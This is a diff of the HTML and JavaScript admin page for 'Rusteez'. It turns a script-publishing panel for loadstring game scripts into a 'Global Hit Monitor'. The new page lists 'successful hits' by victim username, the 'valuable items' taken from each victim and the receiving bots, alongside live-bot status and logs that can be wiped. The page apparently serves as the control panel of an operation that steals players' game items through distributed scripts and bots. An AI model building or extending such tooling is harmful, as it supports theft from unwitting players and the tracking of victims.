@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rusteez - Admin Control</title>
+    <title>Rusteez - Master Control</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -14,12 +14,11 @@
         .tab-btn { border-bottom: 2px solid transparent; transition: all 0.2s; color: #64748b; text-transform: uppercase; font-weight: 900; font-size: 10px; letter-spacing: 0.05em; }
         .tab-btn.active { border-color: #a855f7; color: #a855f7; background: rgba(168, 85, 247, 0.05); }
         
-        input, textarea, select { background: #0f172a !important; border: 1px solid #334155 !important; color: white !important; font-size: 10px !important; outline: none; }
-        input:focus { border-color: #a855f7 !important; }
-        
-        .btn-action { background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.2); color: #a855f7; font-weight: 900; text-transform: uppercase; font-size: 9px; cursor: pointer; }
-        .btn-action:hover { background: #a855f7; color: white; }
-        
+        /* Hit Card Style */
+        .hit-card { background: #111827; border: 1px solid #1f2937; transition: all 0.3s; position: relative; overflow: hidden; }
+        .hit-card:hover { border-color: #a855f7; transform: translateY(-2px); }
+        .badge-item { background: rgba(168, 85, 247, 0.1); border: 1px solid rgba(168, 85, 247, 0.2); color: #c084fc; padding: 2px 6px; border-radius: 3px; font-size: 8px; font-weight: 800; }
+
         .bot-card { background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.2); }
         .hidden { display: none; }
         ::-webkit-scrollbar { width: 4px; }
@@ -31,11 +30,8 @@
     <div id="login-overlay" class="fixed inset-0 z-50 flex items-center justify-center bg-[#080a11]">
         <div class="panel p-8 w-full max-w-sm text-center shadow-2xl">
             <h1 class="text-xl font-black italic uppercase text-purple-500 mb-6">Rusteez <span class="text-white">Admin</span></h1>
-            <input type="password" id="authInput" placeholder="Enter ADMIN_TOKEN..." 
-                   class="w-full p-3 rounded text-center mb-4 border-slate-700">
-            <button onclick="checkAuth()" class="w-full bg-purple-600 hover:bg-purple-500 py-3 rounded font-black uppercase text-[10px] tracking-widest transition-all">
-                Login to Dashboard
-            </button>
+            <input type="password" id="authInput" placeholder="Enter ADMIN_TOKEN..." class="w-full p-3 rounded text-center mb-4 border-slate-700 bg-slate-900">
+            <button onclick="checkAuth()" class="w-full bg-purple-600 hover:bg-purple-500 py-3 rounded font-black uppercase text-[10px] tracking-widest transition-all">Login to Dashboard</button>
             <p id="auth-error" class="text-red-500 text-[9px] mt-4 font-bold uppercase hidden italic underline">Invalid Token Access Denied</p>
         </div>
     </div>
@@ -45,73 +41,43 @@
         <header class="flex justify-between items-center mb-8 bg-slate-900/40 p-4 border border-slate-800 rounded">
             <div>
                 <h1 class="text-xl font-black italic uppercase tracking-tighter text-white">Rusteez <span class="text-purple-500">Central</span></h1>
-                <p class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">Master Control Panel</p>
+                <p class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">Global Hit Monitor</p>
             </div>
-            <div class="flex items-center gap-4">
-                <div class="text-right">
-                    <div class="text-[9px] text-emerald-500 font-black uppercase flex items-center justify-end gap-2">
-                        Authenticated <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
-                    </div>
-                    <button onclick="location.reload()" class="text-slate-600 hover:text-white text-[8px] uppercase font-bold">Logout</button>
+            <div class="text-right">
+                <div class="text-[9px] text-emerald-500 font-black uppercase flex items-center justify-end gap-2">
+                    System Live <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
                 </div>
             </div>
         </header>
 
         <nav class="flex gap-1 mb-6 border-b border-slate-800">
-            <button onclick="switchTab('scripts')" id="tab-scripts" class="tab-btn active px-6 py-3">Scripts Management</button>
-            <button onclick="switchTab('logs')" id="tab-logs" class="tab-btn px-6 py-3">Bot Logs</button>
-            <button onclick="switchTab('bots')" id="tab-bots" class="tab-btn px-6 py-3">Connected Bots</button>
+            <button onclick="switchTab('hits')" id="tab-hits" class="tab-btn active px-6 py-3">Successful Hits</button>
+            <button onclick="switchTab('bots')" id="tab-bots" class="tab-btn px-6 py-3">Live Bots</button>
+            <button onclick="switchTab('logs')" id="tab-logs" class="tab-btn px-6 py-3">Server Logs</button>
         </nav>
 
-        <section id="content-scripts" class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div class="panel p-4 h-fit">
-                <h3 class="text-[10px] font-black text-slate-400 uppercase mb-4 tracking-widest border-b border-slate-800 pb-2">Add New Script</h3>
-                <div class="space-y-3">
-                    <input type="text" id="s-title" placeholder="Title" class="w-full p-2 rounded">
-                    <input type="text" id="s-image" placeholder="Image URL" class="w-full p-2 rounded">
-                    <textarea id="s-desc" placeholder="Description" class="w-full p-2 rounded h-20"></textarea>
-                    <textarea id="s-code" placeholder="loadstring(...)" class="w-full p-2 rounded h-24 font-mono"></textarea>
-                    <select id="s-verified" class="w-full p-2 rounded">
-                        <option value="false">Standard</option>
-                        <option value="true">Verified Badge</option>
-                    </select>
-                    <button onclick="addScript()" class="btn-action w-full py-2.5 rounded">Publish to Site</button>
-                </div>
-            </div>
-            <div class="panel col-span-2">
-                <table class="w-full text-left">
-                    <thead class="bg-black/40 border-b border-slate-800 text-[9px] uppercase font-black text-slate-500">
-                        <tr>
-                            <th class="p-3">Script Name</th>
-                            <th class="p-3 text-center">Views</th>
-                            <th class="p-3 text-right">Delete</th>
-                        </tr>
-                    </thead>
-                    <tbody id="script-list-body"></tbody>
-                </table>
-            </div>
+        <section id="content-hits" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
+            <div class="col-span-full py-20 text-center text-slate-600 uppercase font-black italic">Loading Hit Database...</div>
+        </section>
+
+        <section id="content-bots" class="hidden">
+            <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3" id="bot-grid"></div>
         </section>
 
         <section id="content-logs" class="hidden">
             <div class="panel">
                 <div class="p-3 bg-black/40 border-b border-slate-800 flex justify-between items-center">
-                    <span class="text-[9px] font-black uppercase text-slate-500">Database Event Logs</span>
-                    <button onclick="clearLogs()" class="text-red-500 text-[9px] font-black uppercase hover:underline italic">Clear History</button>
+                    <span class="text-[9px] font-black uppercase text-slate-500">Bot Activity Logs</span>
+                    <button onclick="clearLogs()" class="text-red-500 text-[9px] font-black uppercase hover:underline italic">Wipe History</button>
                 </div>
                 <div id="log-container" class="p-4 h-[500px] overflow-y-auto font-mono text-[10px] space-y-1"></div>
             </div>
-        </section>
-
-        <section id="content-bots" class="hidden">
-            <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3" id="bot-grid">
-                </div>
         </section>
     </div>
 
     <script>
         let GLOBAL_TOKEN = "";
 
-        // --- AUTH & TABS ---
         async function checkAuth() {
             const input = document.getElementById('authInput').value;
             try {
@@ -120,7 +86,7 @@
                     GLOBAL_TOKEN = input;
                     document.getElementById('login-overlay').classList.add('hidden');
                     document.getElementById('admin-content').classList.remove('hidden');
-                    loadScripts();
+                    loadHits();
                 } else { throw new Error(); }
             } catch {
                 document.getElementById('auth-error').classList.remove('hidden');
@@ -133,94 +99,92 @@
             document.getElementById('content-' + name).classList.remove('hidden');
             document.getElementById('tab-' + name).classList.add('active');
             
-            if(name === 'scripts') loadScripts();
+            if(name === 'hits') loadHits();
             if(name === 'logs') loadLogs();
             if(name === 'bots') loadBots();
         }
 
-        // --- SCRIPTS ---
-        async function loadScripts() {
-            const res = await fetch('/api/scripts');
-            const data = await res.json();
-            document.getElementById('script-list-body').innerHTML = data.map(s => `
-                <tr class="border-b border-slate-800/50 hover:bg-white/5">
-                    <td class="p-3 font-bold text-slate-300 text-[10px] uppercase">${s.title}</td>
-                    <td class="p-3 text-center font-mono text-slate-500">${s.views}</td>
-                    <td class="p-3 text-right">
-                        <button onclick="removeScript('${s._id}')" class="text-red-500/50 hover:text-red-500"><i class="fas fa-trash"></i></button>
-                    </td>
-                </tr>
+        // --- HITS MANAGEMENT ---
+        async function loadHits() {
+            try {
+                const res = await fetch(`/api/admin/hits?token=${GLOBAL_TOKEN}`);
+                const hits = await res.json();
+                const container = document.getElementById('content-hits');
+
+                if (hits.length === 0) {
+                    container.innerHTML = `<div class="col-span-full py-20 text-center text-slate-600 uppercase font-black italic">No hits recorded yet</div>`;
+                    return;
+                }
+
+                container.innerHTML = hits.map(hit => `
+                    <div class="hit-card p-4 rounded shadow-lg border-l-4 border-l-purple-600">
+                        <div class="flex justify-between items-start mb-3">
+                            <div>
+                                <h4 class="text-white font-black text-xs uppercase leading-none">${hit.displayName}</h4>
+                                <span class="text-[9px] text-slate-500 font-bold italic lowercase">@${hit.username}</span>
+                            </div>
+                            <span class="text-[8px] text-slate-600 font-mono">${new Date(hit.timestamp).toLocaleDateString()}</span>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <p class="text-[8px] text-slate-500 uppercase font-black mb-1 tracking-tighter">Valuable Items:</p>
+                            <div class="flex flex-wrap gap-1">
+                                ${hit.valuableBrainrots.map(item => `<span class="badge-item">${item}</span>`).join('')}
+                            </div>
+                        </div>
+
+                        <div class="pt-2 border-t border-slate-800/50 flex justify-between items-center">
+                            <span class="text-[8px] text-slate-500 font-bold uppercase">Bots involved:</span>
+                            <span class="text-[8px] text-purple-400 font-black">${hit.receivers.join(', ')}</span>
+                        </div>
+                    </div>
+                `).join('');
+            } catch (e) { console.error("Error loading hits", e); }
+        }
+
+        // --- BOTS MANAGEMENT ---
+        async function loadBots() {
+            const res = await fetch(`/api/admin/bots?token=${GLOBAL_TOKEN}`);
+            const usernames = await res.json();
+            const grid = document.getElementById('bot-grid');
+            
+            if (usernames.length === 0) {
+                grid.innerHTML = `<div class="col-span-full py-20 text-center text-slate-600 uppercase font-black italic">No Bots Online</div>`;
+                return;
+            }
+
+            grid.innerHTML = usernames.map(name => `
+                <div class="bot-card p-3 rounded text-center">
+                    <div class="w-2 h-2 bg-emerald-500 rounded-full mx-auto mb-2 animate-pulse shadow-[0_0_8px_#10b981]"></div>
+                    <div class="text-[10px] font-black text-white uppercase truncate">${name}</div>
+                    <div class="text-[8px] text-emerald-500/50 font-bold mt-1 uppercase">Active</div>
+                </div>
             `).join('');
         }
 
-        async function addScript() {
-            const params = new URLSearchParams({
-                token: GLOBAL_TOKEN,
-                title: document.getElementById('s-title').value,
-                image: document.getElementById('s-image').value,
-                description: document.getElementById('s-desc').value,
-                code: document.getElementById('s-code').value,
-                verified: document.getElementById('s-verified').value
-            });
-            const res = await fetch(`/api/script/add?${params.toString()}`);
-            alert(await res.text());
-            loadScripts();
-        }
-
-        async function removeScript(id) {
-            if(!confirm("Supprimer ?")) return;
-            await fetch(`/api/script/remove?id=${id}&token=${GLOBAL_TOKEN}`);
-            loadScripts();
-        }
-
-        // --- LOGS ---
+        // --- LOGS MANAGEMENT ---
         async function loadLogs() {
             const res = await fetch(`/api/logs?token=${GLOBAL_TOKEN}`);
             const data = await res.json();
             document.getElementById('log-container').innerHTML = data.map(l => `
                 <div class="border-b border-slate-800/20 py-1">
-                    <span class="text-slate-600">[${new Date(l.timestamp).toLocaleTimeString()}]</span>
+                    <span class="text-slate-600 font-mono">[${new Date(l.timestamp).toLocaleTimeString()}]</span>
                     <span class="text-purple-400 font-bold uppercase">@${l.username}</span>: 
-                    <span class="text-slate-300">${l.message}</span>
+                    <span class="text-slate-300 italic">${l.message}</span>
                 </div>
             `).join('');
         }
 
         async function clearLogs() {
-            if(!confirm("Clear all?")) return;
+            if(!confirm("Wipe all logs?")) return;
             await fetch(`/api/logs/clear?token=${GLOBAL_TOKEN}`);
             loadLogs();
         }
 
-        // --- BOTS (WebSocket Status) ---
-        // Pour cette partie, on va demander au serveur la liste des bots actifs
-        async function loadBots() {
-            // Tu dois ajouter une route /api/admin/bots dans ton server.js pour que ça marche
-            try {
-                const res = await fetch(`/api/admin/bots?token=${GLOBAL_TOKEN}`);
-                const usernames = await res.json();
-                const grid = document.getElementById('bot-grid');
-                
-                if (usernames.length === 0) {
-                    grid.innerHTML = `<div class="col-span-full py-20 text-center text-slate-600 uppercase font-black italic">No Bots Currently Online</div>`;
-                    return;
-                }
-
-                grid.innerHTML = usernames.map(name => `
-                    <div class="bot-card p-3 rounded text-center">
-                        <div class="w-2 h-2 bg-emerald-500 rounded-full mx-auto mb-2 animate-pulse shadow-[0_0_8px_#10b981]"></div>
-                        <div class="text-[10px] font-black text-white uppercase truncate">${name}</div>
-                        <div class="text-[8px] text-emerald-500/50 font-bold mt-1 uppercase">WebSocket Active</div>
-                    </div>
-                `).join('');
-            } catch (e) { console.error(e); }
-        }
-
-        // Polling pour les bots toutes les 5 secondes si l'onglet est actif
+        // Refresh auto des bots
         setInterval(() => {
             if (!document.getElementById('content-bots').classList.contains('hidden')) loadBots();
         }, 5000);
-
     </script>
 </body>
 </html>
